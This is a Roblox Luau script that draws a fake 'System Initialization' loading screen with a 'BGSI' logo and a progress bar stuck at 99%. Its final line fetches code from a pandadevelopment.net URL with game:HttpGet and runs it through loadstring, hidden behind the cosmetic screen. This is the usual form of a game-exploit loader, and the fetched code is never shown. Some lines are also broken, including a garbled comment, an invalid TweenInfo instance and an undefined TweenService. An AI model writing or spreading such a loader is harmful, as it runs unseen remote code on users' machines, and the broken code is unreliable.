-- Create a new ScreenGui
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGui"
loadingGui.Enabled = true
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Create a frame for the loading screen
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark gray background
frame.BorderSizePixel = 0
frame.Parent = loadingGui

-- Create a loading bar
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = UDim2.new(0.7, 0, 0.1, 0)
loadingBar.Position = UDim2.new(0.15, 0, 0.45, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Bright green loading bar
loadingBar.BorderSizePixel = 0
loadingBar.Parent = frame

-- Create loading text
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = UDim2.new(0.7, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.15, 0, 0.35, 0)
loadingText.Text = "Loading..."
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextSize = 24
loadingText.Parent = frame

-- Create percentage text
local percentText = Instance.new("TextLabel")
percentText.Name = "PercentText"
percentText.Size = UDim2.new(0.7, 0, 0.1, 0)
percentText.Position = UDim2.new(0.15, 0, 0.55, 0)
percentText.Text = "0%"
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.Font = Enum.Font.SourceSansBold
percentText.TextSize = 24
percentText.Parent = frame

-- Add title text
local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Size = UDim2.new(0.7, 0, 0.1, 0)
titleText.Position = UDim2.new(0.15, 0, 0.25, 0)
titleText.Text = "System Initialization"
titleText.TextColor3 = Color3.fromRGB(150, 150, 255)
titleText.Font = Enum.Font.SourceSansBold
titleText.TextSize = 28
titleText.TextStrokeTransparency = 0.5
titleText.Parent = frame

-- Add logo area
local logoFrame = Instance.new("Frame")
logoFrame.Name = "LogoFrame"
logoFrame.Size = UDim2.new(0.3, 0, 0.3, 0)
logoFrame.Position = UDim2.new(0.35, 0, 0.05, 0)
logoFrame.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
logoFrame.BorderSizePixel = 0
logoFrame.Parent = frame

local logoText = Instance.new("TextLabel")
logoText.Name = "LogoText"
logoText.Size = UDim2.new(1, 0, 1, 0)
logoText.Text = "BGSI"
logoText.TextColor3 = Color3.fromRGB(0, 200, 255)
logoText.Font = Enum.Font.Arcade
logoText.TextSize = 40
logoText.Parent = logoFrame

-- Add gradient effect to loading bar
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.0, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(1.0, Color3.fromRGB(0, 200, 100))}
gradient.Rotation = 90
gradient.Parent = loadingBar

-- Create aقاربubitrate animation for loading text
local pulseAnim = Instance.new(" TweenInfo", TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1))
local pulseTween = TweenService:Create(loadingText, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1), {TextColor3 = Color3.fromRGB(255, 255, 255)})
pulseTween:Play()

-- Start loading process
local currentPercent = 0
local loadThread = coroutine.create(function()
    while currentPercent < 99 do
        currentPercent = currentPercent + 1
        loadingBar.Size = UDim2.new(0.7 * (currentPercent/100), 0, 0.1, 0)
        percentText.Text = currentPercent.."%"
        wait(0.05) -- Adjust speed here
    end
    percentText.Text = "99%"
end)

-- Start the loading thread and load the provided string
coroutine.wrap(function()
    loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    coroutine.resume(loadThread)
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/cc40a4a9f7a417f5"))()
end)()
